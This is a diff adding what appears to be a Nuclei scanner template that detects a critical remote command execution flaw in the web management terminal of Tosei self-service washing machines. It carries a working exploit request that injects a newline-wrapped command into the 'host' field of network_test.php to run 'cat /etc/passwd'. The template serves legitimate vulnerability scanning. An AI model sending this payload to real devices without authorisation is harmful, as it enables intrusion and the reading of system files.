@@ -1,0 +1,32 @@
+id: CVD-2023-1766
+info:
+  name: Tosei Self-Service Washing Machine Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The Tosei self-service washing machine web management terminal has a security vulnerability that could allow attackers to execute arbitrary commands via the network_test.php endpoint, potentially compromising the server.
+  tags: command-execution
+  reference:
+    - https://www.tosei-corporation.co.jp/product-coin/
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+variables:
+  cmd: "cat /etc/passwd"
+http:
+  - raw:
+      - |
+        POST /cgi-bin/network_test.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        host=%0a{{cmd}}%0a&command=ping
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+      - type: status
+        status:
+          - 200
